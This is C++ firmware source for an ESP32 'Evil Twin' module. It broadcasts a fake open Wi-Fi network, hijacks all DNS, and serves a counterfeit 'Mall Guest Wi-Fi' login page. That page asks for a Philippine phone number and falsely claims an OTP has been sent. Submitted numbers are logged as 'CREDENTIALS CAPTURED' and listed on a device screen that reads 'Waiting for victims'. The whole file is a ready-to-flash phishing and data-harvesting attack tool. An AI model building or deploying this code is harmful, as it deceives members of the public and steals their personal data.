#include "config.h"
#include "icon.h"
#include <DNSServer.h>
#include <WebServer.h>

namespace EvilTwin {

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer webServer(80);

char customSSID[20] = "Free_WiFi";
int ssidLen = 9;

const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_- >";
int charIndex = 0;
const int charsetLen = 66;

bool serverActive = false;

const int MAX_CAPTURES = 10;
String capturedPhones[MAX_CAPTURES];
int captureCount = 0;
int captureScrollIndex = 0;
bool newCredentials = false;

unsigned long lastDebounceTime = 0;
const unsigned long debounceDelay = 200;

const char captive_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mall Guest Wi-Fi</title>
  <style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f4f4; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
    .container { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
    h2 { color: #333; margin-bottom: 5px; }
    p { color: #777; margin-bottom: 25px; font-size: 14px; }
    .form-group { text-align: left; margin-bottom: 15px; position: relative; }
    label { display: block; color: #555; margin-bottom: 5px; font-weight: 600; font-size: 14px; }
    .input-wrapper { position: relative; display: flex; align-items: center; }
    .country-code { position: absolute; left: 12px; color: #333; font-size: 16px; font-weight: 500; pointer-events: none; }
    input[type="tel"] { width: 100%; padding: 12px 12px 12px 50px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; margin-bottom: 5px; background: #fff; }
    .btn { background: #007bff; color: white; border: none; padding: 14px; width: 100%; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; margin-top: 10px; }
    .btn:hover { background: #0056b3; }
    .footer { margin-top: 20px; font-size: 12px; color: #aaa; }
    .status { color: #007bff; font-size: 16px; font-weight: bold; margin-top: 15px; display: none; }
    .spinner { margin: 15px auto; width: 30px; height: 30px; border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="container">
    <h2>Guest Wi-Fi</h2>
    <p>Please enter your phone number to receive an SMS with your One-Time Password (OTP) to connect.</p>
    <form id="loginForm">
      <div class="form-group">
        <label for="phone">Phone Number</label>
        <div class="input-wrapper">
          <span class="country-code">+63</span>
          <input type="tel" id="phone" name="phone" placeholder="9123456789" pattern="9[0-9]{9}" maxlength="10" minlength="10" required>
        </div>
      </div>
      <button type="submit" class="btn">Send OTP</button>
    </form>
    <div id="spinner" class="spinner"></div>
    <div id="statusMsg" class="status">Requesting OTP...</div>
    <div class="footer">By connecting, you agree to our Terms of Service and Privacy Policy.</div>
  </div>
  <script>
    document.getElementById('loginForm').onsubmit = function(e) {
      e.preventDefault();
      var phone = document.getElementById('phone').value;
      
      document.getElementById('loginForm').style.display = 'none';
      document.getElementById('spinner').style.display = 'block';
      document.getElementById('statusMsg').style.display = 'block';
      document.getElementById('statusMsg').innerText = "Requesting OTP...";
      
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "/login", true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send("phone=" + encodeURIComponent(phone));
      
      setTimeout(function() {
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('statusMsg').innerText = "OTP Sent! Please check your SMS messages.";
        document.getElementById('statusMsg').style.color = "#28a745";
      }, 2500);
    };
  </script>
</body>
</html>
)rawliteral";

void handleRoot() {
  webServer.send(200, "text/html", captive_html);
}

void handleLogin() {
  if (webServer.hasArg("phone")) {
    if (captureCount < MAX_CAPTURES) {
       capturedPhones[captureCount] = "+63 " + webServer.arg("phone");
       captureCount++;
    }
    newCredentials = true;
    Serial.println("--- CREDENTIALS CAPTURED ---");
    Serial.print("Phone: +63 "); Serial.println(webServer.arg("phone"));
    Serial.println("----------------------------");
  }
  webServer.send(200, "text/plain", "OK");
}

void startServer() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(customSSID);

  // redirect all DNS to ESP32
  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/login", HTTP_POST, handleLogin);
  webServer.onNotFound(handleRoot); // redirect all unknown paths to captive portal

  webServer.begin();
  serverActive = true;
  setNeoPixelColour("red");
  Serial.print("Evil Twin started on SSID: ");
  Serial.println(customSSID);
}

void drawKeyboard() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  
  u8g2.drawStr(0, 15, "Evil Twin SSID:");
  
  // Display current SSID
  u8g2.drawStr(0, 30, customSSID);
  
  // Draw the current character to be added
  int strWidth = u8g2.getStrWidth(customSSID);
  
  char selectedCharStr[2] = {charset[charIndex], '\0'};
  
  // Highlight the selected character
  if (charset[charIndex] == '>') {
    u8g2.drawBox(strWidth, 21, 24, 11);
    u8g2.setDrawColor(0);
    u8g2.drawStr(strWidth + 2, 30, "RUN");
    u8g2.setDrawColor(1);
  } else {
    u8g2.drawBox(strWidth, 21, 8, 11);
    u8g2.setDrawColor(0);
    u8g2.drawStr(strWidth + 1, 30, selectedCharStr);
    u8g2.setDrawColor(1);
  }
  
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 50, "U/D: Change Char");
  u8g2.drawStr(0, 63, "L: Del | R: Add/Run | C: Exit");
  
  u8g2.sendBuffer();
}

void drawServerScreen() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x8_tr);
  
  if (captureCount == 0) {
    u8g2.drawStr(0, 10, "Evil Twin Active");
    u8g2.drawStr(0, 20, "SSID:");
    u8g2.drawStr(30, 20, customSSID);
    u8g2.drawStr(0, 40, "Waiting for victims...");
  } else {
    // Show captured numbers
    u8g2.drawStr(0, 10, "Captured Phones:");
    
    // Draw up to 4 numbers on screen
    int drawCount = min(4, captureCount - captureScrollIndex);
    for (int i = 0; i < drawCount; i++) {
       int index = captureScrollIndex + i;
       u8g2.drawStr(0, 25 + (i * 10), (String(index + 1) + ". " + capturedPhones[index]).c_str());
    }
    
    // Scroll indicators
    if (captureScrollIndex > 0) {
        u8g2.drawStr(120, 25, "^");
    }
    if (captureScrollIndex + 4 < captureCount) {
        u8g2.drawStr(120, 55, "v");
    }
    
    setNeoPixelColour("green");
  }
  
  u8g2.sendBuffer();
}

void handleKeyboardInput() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      charIndex = (charIndex + 1) % charsetLen;
      lastDebounceTime = currentMillis;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      charIndex = (charIndex - 1 + charsetLen) % charsetLen;
      lastDebounceTime = currentMillis;
    } else if (digitalRead(BTN_PIN_LEFT) == LOW) {
      if (ssidLen > 0) {
        ssidLen--;
        customSSID[ssidLen] = '\0';
      }
      lastDebounceTime = currentMillis;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      if (charset[charIndex] == '>') {
        if (ssidLen > 0) {
          startServer();
        }
      } else {
        if (ssidLen < 19) {
          customSSID[ssidLen] = charset[charIndex];
          ssidLen++;
          customSSID[ssidLen] = '\0';
        }
      }
      lastDebounceTime = currentMillis;
    }
    // Note: BUTTON_SELECT_PIN is intentionally ignored here.
    // This allows the main nRFBox.ino loop to catch the SELECT button and natively exit the module!
  }
}

void eviltwinSetup() {
  Serial.begin(115200);
  pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
  pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
  pinMode(BTN_PIN_LEFT, INPUT_PULLUP);
  pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
  pinMode(BUTTON_SELECT_PIN, INPUT_PULLUP);
  
  esp_bt_controller_deinit();
  WiFi.disconnect();
  
  serverActive = false;
  newCredentials = false;
  captureCount = 0;
  captureScrollIndex = 0;
  for(int i=0; i<MAX_CAPTURES; i++) capturedPhones[i] = "";
  setNeoPixelColour("purple");
}

void eviltwinLoop() {
  if (!serverActive) {
    handleKeyboardInput();
    drawKeyboard();
  } else {
    dnsServer.processNextRequest();
    webServer.handleClient();
    drawServerScreen();
    
    unsigned long currentMillis = millis();
    if (currentMillis - lastDebounceTime > debounceDelay) {
       // Scroll captured list
       if (digitalRead(BUTTON_UP_PIN) == LOW) {
          if (captureScrollIndex > 0) {
              captureScrollIndex--;
          }
          lastDebounceTime = currentMillis;
       } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
          if (captureScrollIndex + 4 < captureCount) {
              captureScrollIndex++;
          }
          lastDebounceTime = currentMillis;
       }
    }
    
    // allow exiting by holding SELECT
    if (digitalRead(BUTTON_SELECT_PIN) == LOW) {
       unsigned long currentMillis = millis();
       if (currentMillis - lastDebounceTime > debounceDelay*2) {
          WiFi.softAPdisconnect(true);
          serverActive = false;
          setNeoPixelColour("0");
          lastDebounceTime = currentMillis;
          // return to keyboard
          while(digitalRead(BUTTON_SELECT_PIN) == LOW) { delay(10); } // wait for release
       }
    }
  }
}

} // namespace EvilTwin
